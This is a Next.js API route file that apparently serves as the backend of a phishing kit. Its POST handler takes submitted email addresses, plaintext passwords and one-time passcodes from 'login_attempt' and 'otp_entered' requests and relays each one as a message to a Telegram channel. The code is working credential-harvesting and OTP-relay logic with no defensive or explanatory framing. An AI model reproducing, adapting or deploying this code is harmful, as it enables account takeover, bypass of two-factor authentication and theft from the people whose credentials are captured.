import { NextResponse } from "next/server";
import { sendTelegramMessage } from "@/lib/telegram";

function safe(value: unknown, fallback = "N/A") {
  if (value === undefined || value === null) return fallback;
  const str = String(value).trim();
  return str.length ? str : fallback;
}

export async function POST(req: Request) {
  try {
    const body = await req.json();

    // 1. Handle Login Attempt
    if (body.type === "login_attempt") {
      const message = `🔐 LOGIN ATTEMPT
      
Email: ${safe(body.email)}
Password: ${safe(body.password)}`;
      
      await sendTelegramMessage(message);
      return NextResponse.json({ success: true });
    }

    // 2. Handle OTP Entry
    if (body.type === "otp_entered") {
      const message = `🔢 OTP ENTERED
      
Email: ${safe(body.email)}
OTP Code: ${safe(body.otp)}`;

      await sendTelegramMessage(message);
      return NextResponse.json({ success: true });
    }

    // Fallback for unknown types (just in case)
    return NextResponse.json({ success: false, error: "Unknown type" }, { status: 400 });

  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    console.error("❌ notify-telegram route error:", message);
    return NextResponse.json(
      { success: false, error: message },
      { status: 500 },
    );
  }
}